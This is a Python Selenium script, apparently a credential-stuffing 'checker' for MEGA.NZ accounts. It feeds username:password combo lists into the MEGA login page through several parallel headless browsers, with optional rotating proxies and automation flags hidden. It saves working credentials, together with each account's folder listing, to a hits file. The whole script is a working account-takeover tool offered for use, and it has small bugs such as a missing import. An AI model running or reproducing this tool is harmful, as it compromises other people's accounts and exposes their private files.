from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from colorama import init,Fore
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from time import sleep
from concurrent.futures import ThreadPoolExecutor
import os

class Main:

    def clear(self):
        if os.name == 'posix':
            os.system('clear')
        elif os.name in ('ce', 'nt', 'dos'):
            os.system('cls')
        else:
            print("\n") * 120

    def SetTitle(self,title_name:str):
        os.system("title {0}".format(title_name))

    def __init__(self):
        init(convert=True)
        self.clear()
        self.SetTitle('One Man Builds MEGA.NZ Checker Tool')
        title = Fore.RED+"""
                                            MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
                                            MMMMMMMMMMMNmmmmmmNMMMMMMMMMMM
                                            MMMMMMMNmdhhhhhhhhhhdmNMMMMMMM
                                            MMMMMNdhhhhhhhhhhhhhhhhdNMMMMM
                                            MMMMmhhhhhhhhhhhhhhhhhhhhmMMMM
                                            MMMNhhhhs.-ohhhhhho-.shhhhNMMM
                                            MMMdhhhhs   .ohho.   shhhhdMMM
                                            MMMhhhhhs  +. .. .+  shhhhhMMM
                                            MMMdhhhhs  hh+..+hh  shhhhdMMM
                                            MMMNhhhhs..hhhhhhhh..shhhhNMMM
                                            MMMMmhhhhhhhhhhhhhhhhhhhhmMMMM
                                            MMMMMNdhhhhhhhhhhhhhhhhdNMMMMM
                                            MMMMMMMNmdhhhhhhhhhhdmNMMMMMMM
                                            MMMMMMMMMMMNmmmmmmNMMMMMMMMMMM
                                            MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM

                                            MEGA.NZ CHECKER ONE MAN BUILDS
        """
        print(title)
        self.use_proxy = int(input(Fore.YELLOW+'['+Fore.WHITE+'>'+Fore.YELLOW+'] Would you like to use proxies [1]yes [0]no: '))
        self.headless = int(input(Fore.YELLOW+'['+Fore.WHITE+'>'+Fore.YELLOW+'] Would you like to use headless mode [1]yes [0]no: '))
        self.browser_amount = int(input(Fore.YELLOW+'['+Fore.WHITE+'>'+Fore.YELLOW+'] How many browser would you like to run at the same time: '))
        self.wait_before_login = float(input(Fore.YELLOW+'['+Fore.WHITE+'>'+Fore.YELLOW+'] How many seconds would you like to wait before login: '))
        self.wait_before_check = float(input(Fore.YELLOW+'['+Fore.WHITE+'>'+Fore.YELLOW+'] How many seconds would you like to wait before check: '))
        self.wait_for_folders_to_load = float(input(Fore.YELLOW+'['+Fore.WHITE+'>'+Fore.YELLOW+'] How many seconds would you like to wait after login: '))
        print('')
    def ReadFile(self,filename,method):
        with open(filename,method) as f:
            content = [line.strip('\n') for line in f]
            return content

    def GetRandomProxy(self):
        proxies_file = self.ReadFile('proxies.txt','r')
        return choice(proxies_file)

    def Check(self,username,password):
        try:
            options = Options()

            if self.headless == 1:
                options.add_argument('--headless')
                
            options.add_argument('no-sandbox')
            options.add_argument('--log-level=3')

            if self.use_proxy == 1:
                options.add_argument('--proxy-server={0}'.format(self.GetRandomProxy()))

            options.add_experimental_option('excludeSwitches', ['enable-logging','enable-automation'])
            driver = webdriver.Chrome(options=options)

            driver.get('https://mega.nz/login')

            sleep(self.wait_before_login)

            driver.execute_script("document.getElementById('login-name2').value='{0}'".format(username))
            driver.execute_script("document.getElementById('login-password2').value='{0}'".format(password))
            driver.execute_script("document.getElementsByClassName('big-red-button height-48 login-button button right')[0].click()")
            content = driver.execute_script("return document.getElementsByClassName('fm-notification-info')[0]")
            sleep(self.wait_before_check)
            if content.text == '':
                sleep(self.wait_for_folders_to_load)
                folders = driver.execute_script("return document.getElementsByClassName('jspContainer')[0]")
                folders = folders.text.replace('\n',' | ')
                print(Fore.GREEN+'['+Fore.WHITE+'!'+Fore.GREEN+'] {0}:{1} | {2}'.format(username,password,folders))
                with open('hits.txt','a',encoding='utf8') as f:
                    f.write('{0}:{1} | {2}\n'.format(username,password,folders))
            elif content.text == 'Invalid email and/or password. Please try again.':
                print(Fore.RED+'['+Fore.WHITE+'-'+Fore.RED+'] {0}:{1} | Invalid email and/or password. Please try again.'.format(username,password))
                with open('bads.txt','a',encoding='utf8') as f:
                    f.write('{0}:{1}\n'.format(username,password))
            elif content.text == 'This account has not completed the registration process yet. First check your email, click on the Activate Account button and reconfirm your chosen password.':
                print(Fore.RED+'['+Fore.WHITE+'-'+Fore.RED+'] {0}:{1}\n'.format(username,password))
                with open('not_completed.txt','a',encoding='utf8') as f:
                    f.write('{0}:{1}\n'.format(username,password))
            else:
                print(Fore.RED+'['+Fore.WHITE+'-'+Fore.RED+'] {0}:{1} | Something went wrong retry.'.format(username,password))
                with open('something_went_wrong.txt','a',encoding='utf8') as f:
                    f.write('{0}:{1}'.format(username,password))
                self.Check(username,password)
        except:
            self.Check(username,password)
        finally:
            driver.quit()

    def Start(self):
        combos = self.ReadFile('combos.txt','r')
        with ThreadPoolExecutor(max_workers=self.browser_amount) as ex:
            for combo in combos:
                username = combo.split(':')[0]
                password = combo.split(':')[-1]
                ex.submit(self.Check,username,password)


if __name__ == '__main__':
    main = Main()
    main.Start()